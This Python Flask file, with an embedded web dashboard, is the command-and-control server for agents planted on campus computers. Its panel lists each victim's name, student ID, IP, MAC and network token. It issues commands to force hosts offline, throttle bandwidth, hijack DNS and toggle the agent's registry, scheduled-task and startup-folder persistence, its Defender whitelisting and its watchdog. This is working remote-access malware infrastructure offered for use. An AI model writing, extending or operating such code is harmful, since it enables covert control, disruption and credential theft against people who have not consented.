#!/usr/bin/env python3
"""
校园网远程控制面板 - Server
功能: 查看所有 Agent 状态、远程下线/登录、查看 token
      持久化存储: 历史 Agent、命令记录均保存到磁盘
"""
import json, time, uuid, os, threading, hashlib
from flask import Flask, request, jsonify, Response

app = Flask(__name__)

# API 鉴权密钥 (必须与 Agent 一致)
API_SECRET = "CampusNet@2026#Secure"
AUTH_TOLERANCE = 300  # 时间戳容差(秒)

def _verify_auth():
    """验证 Agent API 请求签名"""
    ts = request.headers.get("X-Auth-Ts", "")
    sig = request.headers.get("X-Auth-Sig", "")
    if not ts or not sig:
        return False
    try:
        if abs(time.time() - int(ts)) > AUTH_TOLERANCE:
            return False
    except:
        return False
    body = request.get_data(as_text=True)
    expected = hashlib.sha256(f"{API_SECRET}:{ts}:{body[:64]}".encode()).hexdigest()[:16]
    return sig == expected

# ============ 持久化存储 ============
DATA_DIR = os.path.dirname(os.path.abspath(__file__))
AGENTS_FILE = os.path.join(DATA_DIR, "server_agents.json")
HISTORY_FILE = os.path.join(DATA_DIR, "server_history.json")

agents = {}      # agent_id -> {状态信息}
commands = {}    # agent_id -> [待执行命令列表]
history = []     # [{time, agent_id, hostname, action, detail, success}]
blacklist = set() # 被删除的 agent_id，拒绝重连
lock = threading.Lock()
BLACKLIST_FILE = os.path.join(DATA_DIR, "server_blacklist.json")

def _load_data():
    global agents, history, blacklist
    if os.path.exists(AGENTS_FILE):
        try:
            with open(AGENTS_FILE, "r", encoding="utf-8") as f:
                agents.update(json.load(f))
            print(f"  [DATA] 已加载 {len(agents)} 个历史 Agent")
        except: pass
    if os.path.exists(HISTORY_FILE):
        try:
            with open(HISTORY_FILE, "r", encoding="utf-8") as f:
                history.extend(json.load(f))
            print(f"  [DATA] 已加载 {len(history)} 条历史记录")
        except: pass
    if os.path.exists(BLACKLIST_FILE):
        try:
            with open(BLACKLIST_FILE, "r", encoding="utf-8") as f:
                blacklist.update(json.load(f))
            print(f"  [DATA] 已加载 {len(blacklist)} 个黑名单 Agent")
        except: pass

def _save_blacklist():
    try:
        with open(BLACKLIST_FILE, "w", encoding="utf-8") as f:
            json.dump(list(blacklist), f)
    except: pass

def _save_agents():
    try:
        with open(AGENTS_FILE, "w", encoding="utf-8") as f:
            json.dump(agents, f, ensure_ascii=False, indent=2)
    except: pass

def _save_history():
    try:
        with open(HISTORY_FILE, "w", encoding="utf-8") as f:
            json.dump(history[-500:], f, ensure_ascii=False, indent=2)
    except: pass

def _add_history(agent_id, action, detail="", success=None):
    hostname = agents.get(agent_id, {}).get("hostname", agent_id[:8])
    entry = {
        "time": time.time(),
        "agent_id": agent_id,
        "hostname": hostname,
        "action": action,
        "detail": detail,
        "success": success,
    }
    history.append(entry)
    if len(history) > 500:
        del history[:-500]
    _save_history()

# ============ API: Agent 端 ============

@app.route("/api/heartbeat", methods=["POST"])
def heartbeat():
    """Agent 定时心跳上报"""
    if not _verify_auth():
        return jsonify({"error": "auth failed"}), 403
    data = request.json or {}
    aid = data.get("agent_id")
    if not aid:
        return jsonify({"error": "no agent_id"}), 400
    if aid in blacklist:
        return jsonify({"error": "blocked", "commands": [{"id": "blk", "command": "exit"}]}), 403
    with lock:
        is_new = aid not in agents
        was_alive = agents.get(aid, {}).get("alive", False)
        agents[aid] = {**data, "last_seen": time.time(), "alive": True}
        pending = commands.pop(aid, [])
        _save_agents()
        if is_new:
            _add_history(aid, "首次连接", f"主机: {data.get('hostname','')} IP: {data.get('local_ip','')}")
        elif not was_alive:
            _add_history(aid, "重新上线", f"IP: {data.get('local_ip','')}")
    return jsonify({"commands": pending})

@app.route("/api/report", methods=["POST"])
def report():
    """Agent 回报命令执行结果"""
    if not _verify_auth():
        return jsonify({"error": "auth failed"}), 403
    data = request.json or {}
    cid = data.get("cmd_id")
    aid = data.get("agent_id", "")
    if cid:
        with lock:
            _add_history(aid, f"命令结果", data.get("message", ""), data.get("success"))
    return jsonify({"ok": True})

# ============ API: Web 面板 ============

@app.route("/api/delete_agent", methods=["POST"])
def delete_agent():
    """删除 Agent 并加入黑名单"""
    data = request.json or {}
    aid = data.get("agent_id")
    block = data.get("block", True)
    if not aid:
        return jsonify({"error": "missing agent_id"}), 400
    with lock:
        hostname = agents.get(aid, {}).get("hostname", aid[:8])
        agents.pop(aid, None)
        commands.pop(aid, None)
        _save_agents()
        if block:
            blacklist.add(aid)
            _save_blacklist()
        _add_history(aid, "删除设备" + ("+拉黑" if block else ""), f"主机: {hostname}")
    return jsonify({"ok": True})

@app.route("/api/unblock_agent", methods=["POST"])
def unblock_agent():
    """解除黑名单"""
    data = request.json or {}
    aid = data.get("agent_id")
    if not aid:
        return jsonify({"error": "missing agent_id"}), 400
    with lock:
        blacklist.discard(aid)
        _save_blacklist()
        _add_history(aid, "解除黑名单")
    return jsonify({"ok": True})

@app.route("/api/agents")
def get_agents():
    now = time.time()
    result = []
    with lock:
        for aid, d in agents.items():
            item = dict(d)
            last = d.get("last_seen", 0)
            dt = now - last
            if dt > 30:
                item["alive"] = False
                if dt > 300:
                    item["status_text"] = "离线"
                    item["status_cls"] = "off"
                else:
                    item["status_text"] = "失联"
                    item["status_cls"] = "aw"
            else:
                item["alive"] = True
                item["status_text"] = "在线" if d.get("net_online") else "已连接(未认证)"
                item["status_cls"] = "on" if d.get("net_online") else "aw"
            result.append(item)
    result.sort(key=lambda x: (0 if x.get("alive") else 1, -x.get("last_seen", 0)))
    return jsonify(result)

@app.route("/api/command", methods=["POST"])
def send_command():
    """面板下发命令给 Agent"""
    data = request.json or {}
    aid = data.get("agent_id")
    cmd = data.get("command")
    if not aid or not cmd:
        return jsonify({"error": "missing agent_id or command"}), 400
    cid = str(uuid.uuid4())[:8]
    with lock:
        commands.setdefault(aid, []).append({
            "id": cid,
            "command": cmd,
            "params": data.get("params", {}),
            "time": time.time(),
        })
        _add_history(aid, f"下发命令: {cmd}", json.dumps(data.get("params", {}), ensure_ascii=False))
    return jsonify({"ok": True, "cmd_id": cid})

@app.route("/api/history")
def get_history():
    """获取操作历史"""
    n = request.args.get("n", 100, type=int)
    with lock:
        items = history[-n:]
    items.reverse()
    return jsonify(items)

# ============ Web 面板 ============

@app.route("/")
def dashboard():
    return Response(HTML_PAGE, content_type="text/html; charset=utf-8")

HTML_PAGE = r"""<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>校园网远程控制面板</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
:root{--bg:#f0f2f5;--card:#fff;--primary:#4f46e5;--green:#10b981;--red:#ef4444;--orange:#f59e0b;--gray:#6b7280;--border:#e5e7eb;--text:#1f2937;--sub:#9ca3af}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:var(--bg);color:var(--text);min-height:100vh}
.header{background:linear-gradient(135deg,#4f46e5,#7c3aed);color:#fff;padding:20px 24px;display:flex;align-items:center;justify-content:space-between;box-shadow:0 2px 8px rgba(0,0,0,.15)}
.header h1{font-size:20px;font-weight:600}
.header .info{font-size:13px;opacity:.85}
.container{max-width:1200px;margin:0 auto;padding:20px}
.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:16px;margin-bottom:24px}
.stat-card{background:var(--card);border-radius:12px;padding:20px;text-align:center;box-shadow:0 1px 3px rgba(0,0,0,.08)}
.stat-card .num{font-size:32px;font-weight:700;color:var(--primary)}
.stat-card .label{font-size:13px;color:var(--sub);margin-top:4px}
.section{margin-bottom:24px}
.section h2{font-size:16px;font-weight:600;margin-bottom:12px;display:flex;align-items:center;gap:8px}
.agent-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(360px,1fr));gap:16px}
.agent{background:var(--card);border-radius:12px;padding:20px;box-shadow:0 1px 3px rgba(0,0,0,.08);border-left:4px solid var(--gray);transition:all .2s}
.agent.online{border-left-color:var(--green)}
.agent.offline{border-left-color:var(--red)}
.agent.away{border-left-color:var(--orange)}
.agent-head{display:flex;justify-content:space-between;align-items:center;margin-bottom:12px}
.agent-name{font-weight:600;font-size:15px}
.badge{display:inline-flex;align-items:center;gap:4px;font-size:11px;padding:2px 10px;border-radius:20px;font-weight:500}
.badge.on{background:#d1fae5;color:#065f46}
.badge.off{background:#fee2e2;color:#991b1b}
.badge.aw{background:#fef3c7;color:#92400e}
.badge::before{content:"";width:6px;height:6px;border-radius:50%;display:inline-block}
.badge.on::before{background:#10b981}
.badge.off::before{background:#ef4444}
.badge.aw::before{background:#f59e0b}
.info-row{display:flex;justify-content:space-between;padding:6px 0;font-size:13px;border-bottom:1px solid var(--border)}
.info-row:last-child{border:none}
.info-row .k{color:var(--sub)}
.info-row .v{font-family:'Courier New',monospace;font-size:12px;max-width:220px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;text-align:right}
.info-row .v.full{white-space:normal;word-break:break-all;max-width:none}
.actions{display:flex;gap:8px;margin-top:14px;flex-wrap:wrap}
.btn{border:none;padding:7px 16px;border-radius:8px;font-size:12px;font-weight:500;cursor:pointer;transition:all .15s}
.btn:hover{filter:brightness(1.1);transform:translateY(-1px)}
.btn-red{background:#fee2e2;color:#dc2626}
.btn-blue{background:#dbeafe;color:#2563eb}
.btn-green{background:#d1fae5;color:#059669}
.btn-orange{background:#fef3c7;color:#d97706}
.token-box{margin-top:8px;background:#f8fafc;border:1px solid var(--border);border-radius:8px;padding:10px;font-size:11px;font-family:monospace;word-break:break-all;color:var(--gray);display:none;max-height:120px;overflow-y:auto}
.log-box{background:var(--card);border-radius:12px;padding:16px;box-shadow:0 1px 3px rgba(0,0,0,.08);max-height:300px;overflow-y:auto;font-size:12px;font-family:monospace}
.log-box div{padding:3px 0;border-bottom:1px solid #f3f4f6}
.log-box .ok{color:#059669}
.log-box .err{color:#dc2626}
.empty{text-align:center;color:var(--sub);padding:60px 20px;font-size:14px}
.autostart-row{display:flex;align-items:center;justify-content:space-between;margin-top:10px;padding:10px 12px;background:#f8fafc;border-radius:8px;border:1px solid var(--border)}
.autostart-row .label{font-size:13px;color:var(--text);font-weight:500}
.toggle{position:relative;width:44px;height:24px;cursor:pointer}
.toggle input{opacity:0;width:0;height:0}
.toggle .slider{position:absolute;top:0;left:0;right:0;bottom:0;background:#ccc;border-radius:24px;transition:.3s}
.toggle .slider::before{content:"";position:absolute;width:18px;height:18px;left:3px;bottom:3px;background:#fff;border-radius:50%;transition:.3s}
.toggle input:checked+.slider{background:var(--green)}
.toggle input:checked+.slider::before{transform:translateX(20px)}
.modal-overlay{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.5);z-index:1000;align-items:center;justify-content:center}
.modal-overlay.show{display:flex}
.modal{background:#fff;border-radius:16px;padding:28px;max-width:380px;width:90%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.3)}
.modal h3{font-size:18px;margin-bottom:8px}
.modal p{font-size:13px;color:var(--sub);margin-bottom:20px;line-height:1.6}
.modal .warn{color:var(--orange);font-weight:600;font-size:14px}
.modal-btns{display:flex;gap:12px;justify-content:center}
.modal-btns .btn{padding:10px 24px;font-size:14px}
@media(max-width:600px){.agent-grid{grid-template-columns:1fr}.stats{grid-template-columns:repeat(2,1fr)}}
</style>
</head>
<body>

<div class="header">
  <div>
    <h1>🌐 校园网远程控制面板</h1>
    <div class="info">实时监控所有 Agent · 远程管理设备</div>
  </div>
  <div class="info" id="clock"></div>
</div>

<div class="container">
  <div class="stats">
    <div class="stat-card"><div class="num" id="totalCnt">0</div><div class="label">总设备</div></div>
    <div class="stat-card"><div class="num" id="onlineCnt" style="color:#10b981">0</div><div class="label">在线</div></div>
    <div class="stat-card"><div class="num" id="offlineCnt" style="color:#ef4444">0</div><div class="label">离线</div></div>
    <div class="stat-card"><div class="num" id="awayCnt" style="color:#f59e0b">0</div><div class="label">失联</div></div>
  </div>

  <div class="section">
    <h2>📡 设备列表</h2>
    <div class="agent-grid" id="agentGrid">
      <div class="empty">暂无 Agent 连接，请在客户端启动 agent.py</div>
    </div>
  </div>

  <div class="modal-overlay" id="confirmModal">
  <div class="modal">
    <h3 id="modalTitle">确认操作</h3>
    <p id="modalMsg"></p>
    <p class="warn">❗ 请再次确认执行此操作</p>
    <div class="modal-btns">
      <button class="btn btn-red" onclick="confirmAction()">确认执行</button>
      <button class="btn btn-blue" onclick="closeModal()">取消</button>
    </div>
  </div>
</div>

<div class="section">
    <h2>📋 操作日志 <span style="font-size:12px;color:#9ca3af;font-weight:400;margin-left:8px">(本次会话)</span></h2>
    <div class="log-box" id="logBox"><div style="color:#9ca3af">等待操作...</div></div>
  </div>

  <div class="section">
    <h2>📜 历史记录 <span style="font-size:12px;color:#9ca3af;font-weight:400;margin-left:8px">(持久化保存)</span></h2>
    <div class="log-box" id="historyBox" style="max-height:400px"><div style="color:#9ca3af">加载中...</div></div>
  </div>
</div>

<script>
const API = "/gyk";

function ts(t){
  if(!t)return "--";
  const d=new Date(t*1000);
  return d.toLocaleTimeString("zh-CN",{hour12:false})+` ${d.getMonth()+1}/${d.getDate()}`;
}

function ago(t){
  if(!t)return "--";
  const s=Math.floor(Date.now()/1000-t);
  if(s<5)return "刚刚";
  if(s<60)return s+"秒前";
  if(s<3600)return Math.floor(s/60)+"分钟前";
  return Math.floor(s/3600)+"小时前";
}

function toggleToken(id){
  const el=document.getElementById("tok-"+id);
  el.style.display=el.style.display==="block"?"none":"block";
}

let pendingAction=null;
function toggleAutostart(agentId, hostname, currentState){
  const action=currentState?"disable_autostart":"enable_autostart";
  const actionText=currentState?"禁用开机自启":"启用开机自启";
  pendingAction={agentId,action};
  document.getElementById("modalTitle").textContent=actionText;
  document.getElementById("modalMsg").innerHTML=
    `设备: <b>${hostname}</b><br>` +
    `操作: <b>${actionText}</b><br><br>` +
    `这将${currentState?"删除该设备的开机自动运行配置":"在该设备上设置开机后自动启动 Agent"}`;
  document.getElementById("confirmModal").className="modal-overlay show";
}
function closeModal(){
  document.getElementById("confirmModal").className="modal-overlay";
  pendingAction=null;
}
function forceOffline(agentId,hostname){
  pendingAction={agentId,action:'logout'};
  document.getElementById("modalTitle").textContent="强制下线";
  document.getElementById("modalMsg").innerHTML=
    `设备: <b>${hostname}</b><br><br>`+
    `<label style="font-size:13px">离线持续时间:</label><br>`+
    `<select id="offlineDuration" style="padding:6px 12px;border-radius:8px;border:1px solid #e5e7eb;font-size:13px;margin-top:6px;width:100%">`+
    `<option value="0">永久 (手动解锁)</option>`+
    `<option value="15">15秒</option>`+
    `<option value="30">30秒</option>`+
    `<option value="60">1分钟</option>`+
    `<option value="300" selected>5分钟</option>`+
    `<option value="600">10分钟</option>`+
    `<option value="1800">30分钟</option>`+
    `<option value="3600">1小时</option>`+
    `<option value="7200">2小时</option>`+
    `<option value="86400">24小时</option>`+
    `</select>`;
  document.getElementById("confirmModal").className="modal-overlay show";
}
async function confirmAction(){
  if(!pendingAction)return;
  const{agentId,action}=pendingAction;
  let params={};
  if(action==='logout'){
    const sel=document.getElementById("offlineDuration");
    if(sel)params.duration=parseInt(sel.value);
  } else if(action==='set_bandwidth'){
    const sel=document.getElementById("bwRate");
    if(sel)params.rate_kbps=parseInt(sel.value);
  } else if(action==='set_dns'){
    const sel=document.getElementById("dnsSelect");
    if(sel){
      if(sel.value==='custom'){
        const inp=document.getElementById("dnsCustom");
        params.primary=inp?inp.value.trim():'127.0.0.1';
      } else {
        params.primary=sel.value;
      }
    }
  }
  closeModal();
  if(action==='__delete__'){
    const block=document.getElementById('blockCheck')?.checked??true;
    await doDelete(agentId,block);
  } else {
    await sendCmd(agentId,action,params);
  }
}

function confirmUninstall(agentId,hostname){
  pendingAction={agentId,action:'uninstall'};
  document.getElementById("modalTitle").textContent="⚠️ 完全卸载";
  document.getElementById("modalMsg").innerHTML=
    `设备: <b>${hostname}</b><br><br>`+
    `<span style="color:#dc2626;font-weight:600">此操作将完全移除该设备上的 Agent：</span><br>`+
    `• 删除所有自启动项 (注册表+计划任务+启动夹)<br>`+
    `• 解除文件防护和 Defender 白名单<br>`+
    `• 删除配置文件<br>`+
    `• 停止看门狗和 Agent 进程<br><br>`+
    `<b style="color:#dc2626">卸载后无法远程恢复，需到现场重新安装！</b>`;
  document.getElementById("confirmModal").className="modal-overlay show";
}

function deleteAgent(agentId,hostname){
  pendingAction={agentId,action:'__delete__'};
  document.getElementById("modalTitle").textContent="删除设备";
  document.getElementById("modalMsg").innerHTML=
    `设备: <b>${hostname}</b><br><br>`+
    `<label><input type="checkbox" id="blockCheck" checked> 同时拉黑（禁止重新连接）</label>`;
  document.getElementById("confirmModal").className="modal-overlay show";
}
async function doDelete(agentId,block){
  addLog(`删除设备: ${agentId.substring(0,8)}... ${block?"+拉黑":""}`);
  try{
    const r=await fetch(API+"/api/delete_agent",{method:"POST",headers:{"Content-Type":"application/json"},
      body:JSON.stringify({agent_id:agentId,block})});
    const j=await r.json();
    if(j.ok){addLog("删除成功","ok");refresh();}
    else addLog(`删除失败: ${j.error}`,"err");
  }catch(e){addLog(`网络错误: ${e}`,"err")}
}

function setBandwidth(agentId,hostname,current){
  pendingAction={agentId,action:'set_bandwidth'};
  document.getElementById("modalTitle").textContent="⚡ 设置限速";
  document.getElementById("modalMsg").innerHTML=
    `设备: <b>${hostname}</b><br>`+
    `当前: <b>${current?current+'KB/s':'无限制'}</b><br><br>`+
    `<label style="font-size:13px">限速值 (KB/s):</label><br>`+
    `<select id="bwRate" style="padding:6px 12px;border-radius:8px;border:1px solid #e5e7eb;font-size:13px;margin-top:6px;width:100%">`+
    `<option value="10">10 KB/s (极慢)</option>`+
    `<option value="50">50 KB/s</option>`+
    `<option value="100" selected>100 KB/s</option>`+
    `<option value="200">200 KB/s</option>`+
    `<option value="500">500 KB/s</option>`+
    `<option value="1024">1 MB/s</option>`+
    `<option value="2048">2 MB/s</option>`+
    `<option value="5120">5 MB/s</option>`+
    `</select>`;
  document.getElementById("confirmModal").className="modal-overlay show";
}

function setDns(agentId,hostname){
  pendingAction={agentId,action:'set_dns'};
  document.getElementById("modalTitle").textContent="🌐 篡改 DNS";
  document.getElementById("modalMsg").innerHTML=
    `设备: <b>${hostname}</b><br><br>`+
    `<label style="font-size:13px">主 DNS:</label><br>`+
    `<select id="dnsSelect" style="padding:6px 12px;border-radius:8px;border:1px solid #e5e7eb;font-size:13px;margin-top:6px;width:100%">`+
    `<option value="127.0.0.1">127.0.0.1 (本地回环, 几乎断网)</option>`+
    `<option value="0.0.0.0">0.0.0.0 (无效, 断网)</option>`+
    `<option value="1.1.1.1">1.1.1.1 (Cloudflare, 正常)</option>`+
    `<option value="8.8.8.8">8.8.8.8 (Google, 正常)</option>`+
    `<option value="114.114.114.114">114.114.114.114 (国内公共, 正常)</option>`+
    `<option value="custom">自定义...</option>`+
    `</select>`+
    `<input id="dnsCustom" type="text" placeholder="输入自定义DNS IP" style="display:none;margin-top:6px;padding:6px 12px;border-radius:8px;border:1px solid #e5e7eb;font-size:13px;width:calc(100% - 26px)">`;
  document.getElementById("confirmModal").className="modal-overlay show";
  setTimeout(()=>{
    const sel=document.getElementById('dnsSelect');
    const inp=document.getElementById('dnsCustom');
    if(sel&&inp){sel.onchange=()=>{inp.style.display=sel.value==='custom'?'block':'none';};}
  },50);
}

async function sendCmd(agentId, cmd, params={}){
  addLog(`下发命令: ${cmd} → ${agentId.substring(0,8)}...`);
  try{
    const r=await fetch(API+"/api/command",{method:"POST",headers:{"Content-Type":"application/json"},
      body:JSON.stringify({agent_id:agentId,command:cmd,params})});
    const j=await r.json();
    if(j.ok)addLog(`命令已发送 (${j.cmd_id})`, "ok");
    else addLog(`发送失败: ${j.error}`,"err");
  }catch(e){addLog(`网络错误: ${e}`,"err")}
}

function addLog(msg,type=""){
  const box=document.getElementById("logBox");
  const t=new Date().toLocaleTimeString("zh-CN",{hour12:false});
  box.innerHTML=`<div class="${type}">[${t}] ${msg}</div>`+box.innerHTML;
  if(box.children.length>100)box.removeChild(box.lastChild);
}

async function refresh(){
  try{
    const r=await fetch(API+"/api/agents");
    const agents=await r.json();
    const grid=document.getElementById("agentGrid");
    
    let online=0,offline=0,away=0;
    agents.forEach(a=>{
      if(a.alive && a.net_online)online++;
      else if(a.alive)away++;
      else offline++;
    });
    
    document.getElementById("totalCnt").textContent=agents.length;
    document.getElementById("onlineCnt").textContent=online;
    document.getElementById("offlineCnt").textContent=offline;
    document.getElementById("awayCnt").textContent=away;
    
    if(!agents.length){
      grid.innerHTML='<div class="empty">暂无 Agent 连接，请在客户端启动 agent.py</div>';
      grid._prevKey="";
    } else {
    const newHtml=agents.map(a=>{
      const cls=a.status_cls||"off";
      const stMap={"on":"online","off":"offline","aw":"away"};
      return `
      <div class="agent ${stMap[cls]||'offline'}" data-aid="${a.agent_id}">
        <div class="agent-head">
          <span class="agent-name">💻 ${a.hostname||a.agent_id}</span>
          <span class="badge ${cls}">${a.status_text||"未知"}</span>
        </div>
        <div class="info-row"><span class="k">Agent ID</span><span class="v">${a.agent_id||"--"}</span></div>
        <div class="info-row"><span class="k">👤 用户姓名</span><span class="v" style="color:#0891b2;font-weight:600">${a.username||"--"}</span></div>
        <div class="info-row"><span class="k">🎓 学号</span><span class="v" style="color:#0891b2">${a.user_id||"--"}</span></div>
        <div class="info-row"><span class="k">局域网 IP</span><span class="v">${a.local_ip||"--"}</span></div>
        <div class="info-row"><span class="k">校园网 IP</span><span class="v">${a.user_ip||a.campus_ip||"--"}</span></div>
        <div class="info-row"><span class="k">MAC</span><span class="v">${a.mac||"--"}</span></div>
        <div class="info-row"><span class="k">网络状态</span><span class="v">${a.force_offline?"🔒 "+(a.net_message||"强制离线中"):a.net_online?"✅ 已认证":"❌ 未认证"}</span></div>
        <div class="info-row"><span class="k">⚡ 限速</span><span class="v" style="color:${a.bandwidth_limit?'#dc2626':'#16a34a'}">${a.bandwidth_limit?'🔻 '+a.bandwidth_limit+'KB/s':'无限制'}</span></div>
        <div class="info-row"><span class="k">🌐 DNS</span><span class="v" style="color:${a.dns_hijacked?'#dc2626':'#16a34a'}">${a.dns_hijacked?'⚠️ '+a.dns_servers:'自动(DHCP)'}</span></div>
        <div class="info-row"><span class="k">最后心跳</span><span class="v">${ago(a.last_seen)}</span></div>
        <div class="info-row"><span class="k">运行时间</span><span class="v">${a.uptime||"--"}</span></div>
        <div class="autostart-row">
          <span class="label">🚀 开机自启 <span style="font-size:11px;color:#9ca3af;font-weight:400">${a.autostart_reg?"注册表✓":"注册表✗"} | ${a.autostart_task?"计划任务✓":"计划任务✗"} | ${a.autostart_lnk?"启动夹✓":"启动夹✗"}</span></span>
          <label class="toggle" onclick="toggleAutostart('${a.agent_id}','${a.hostname||a.agent_id}',${!!a.autostart})">
            <input type="checkbox" ${a.autostart?"checked":""} onclick="event.preventDefault()">
            <span class="slider"></span>
          </label>
        </div>
        <div class="actions">
          <button class="btn btn-red" onclick="forceOffline('${a.agent_id}','${a.hostname||a.agent_id}')">⏏ 强制下线</button>
          <button class="btn btn-green" onclick="sendCmd('${a.agent_id}','unlock')">🔓 解除锁定</button>
          <button class="btn btn-blue" onclick="sendCmd('${a.agent_id}','refresh')">🔄 刷新</button>
          <button class="btn btn-orange" onclick="sendCmd('${a.agent_id}','cancel_mab')">🚫 取消无感</button>
          <button class="btn" style="background:#f1f5f9;color:#64748b" onclick="toggleToken('${a.agent_id}')">🔑 Token</button>
        </div>
        <div class="actions" style="margin-top:6px">
          <button class="btn" style="background:${a.bandwidth_limit?'#fef2f2':'#f0fdf4'};color:${a.bandwidth_limit?'#b91c1c':'#166534'}" onclick="setBandwidth('${a.agent_id}','${a.hostname||a.agent_id}',${a.bandwidth_limit||0})">${a.bandwidth_limit?'🔻 改限速':'⚡ 限速'}</button>
          ${a.bandwidth_limit?`<button class="btn btn-green" onclick="sendCmd('${a.agent_id}','clear_bandwidth')">🚀 解除限速</button>`:''}
          <button class="btn" style="background:${a.dns_hijacked?'#fef2f2':'#eff6ff'};color:${a.dns_hijacked?'#b91c1c':'#1e40af'}" onclick="setDns('${a.agent_id}','${a.hostname||a.agent_id}')">${a.dns_hijacked?'🌐 改DNS':'🌐 篡改DNS'}</button>
          ${a.dns_hijacked?`<button class="btn btn-green" onclick="sendCmd('${a.agent_id}','reset_dns')">🔄 恢复DNS</button>`:''}
        </div>
        <div class="actions" style="margin-top:6px">
          <button class="btn btn-green" onclick="sendCmd('${a.agent_id}','protect')">🛡️ 启用防护</button>
          <button class="btn" style="background:#fef2f2;color:#b91c1c" onclick="sendCmd('${a.agent_id}','unprotect')">🔓 解除防护</button>
          <button class="btn" style="background:#ede9fe;color:#6d28d9" onclick="sendCmd('${a.agent_id}','start_watchdog')">👁️ 看门狗</button>
          <button class="btn" style="background:#450a0a;color:#fca5a5" onclick="confirmUninstall('${a.agent_id}','${a.hostname||a.agent_id}')">🗑️ 卸载</button>
          <button class="btn" style="background:#1f2937;color:#fff" onclick="deleteAgent('${a.agent_id}','${a.hostname||a.agent_id}')">❌ 删除</button>
        </div>
        <div class="token-box" id="tok-${a.agent_id}">${a.user_index||"无 token"}</div>
      </div>`;
    }).join("");
    // 只在内容变化时更新DOM (排除心跳时间等动态字段避免闪烁)
    const stableKey=agents.map(a=>`${a.agent_id}|${a.status_cls}|${a.net_online}|${a.force_offline}|${a.autostart}|${a.autostart_reg}|${a.autostart_task}|${a.autostart_lnk}|${a.username}|${a.user_id}|${a.user_ip}|${a.campus_ip}|${a.local_ip}|${a.bandwidth_limit||''}|${a.dns_hijacked||''}|${a.dns_servers||''}`).join(";");
    if(stableKey!==grid._prevKey){grid.innerHTML=newHtml;grid._prevKey=stableKey;}
    else{
      // 只更新动态文本(心跳/运行时间)不重建DOM
      agents.forEach(a=>{
        const card=grid.querySelector(`[data-aid="${a.agent_id}"]`);
        if(card){
          const vs=card.querySelectorAll('.v');
          vs.forEach(v=>{
            if(v.previousElementSibling&&v.previousElementSibling.textContent==='最后心跳')v.textContent=ago(a.last_seen);
            if(v.previousElementSibling&&v.previousElementSibling.textContent==='运行时间')v.textContent=a.uptime||'--';
            if(v.previousElementSibling&&v.previousElementSibling.textContent==='网络状态')v.innerHTML=a.force_offline?'🔒 '+(a.net_message||'强制离线中'):a.net_online?'✅ 已认证':'❌ 未认证';
          });
        }
      });
    }
    }
    
    // 拉取历史记录
    const hr=await fetch(API+"/api/history?n=50");
    const hist=await hr.json();
    const hbox=document.getElementById("historyBox");
    if(hist.length){
      hbox.innerHTML=hist.map(h=>{
        const t=new Date(h.time*1000).toLocaleString("zh-CN",{hour12:false});
        const cls=h.success===true?"ok":h.success===false?"err":"";
        const icon=h.success===true?"✅":h.success===false?"❌":"📌";
        return `<div class="${cls}">${icon} [${t}] <b>${h.hostname||""}</b> ${h.action} ${h.detail?'<span style="color:#9ca3af">'+h.detail+'</span>':''}</div>`;
      }).join("");
    }
    
  }catch(e){console.error(e)}
}

function updateClock(){
  document.getElementById("clock").textContent=new Date().toLocaleString("zh-CN",{hour12:false});
}

setInterval(refresh, 3000);
setInterval(updateClock, 1000);
refresh();
updateClock();
</script>
</body>
</html>
"""

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="校园网远程控制面板")
    parser.add_argument("--host", default="0.0.0.0", help="监听地址")
    parser.add_argument("--port", type=int, default=9090, help="监听端口")
    args = parser.parse_args()
    
    print("=" * 50)
    print("  校园网远程控制面板")
    print("=" * 50)
    _load_data()
    print(f"  ➜ http://localhost:{args.port}")
    print(f"  ➜ http://0.0.0.0:{args.port}  (局域网)")
    print("=" * 50)
    
    app.run(host=args.host, port=args.port, debug=False)
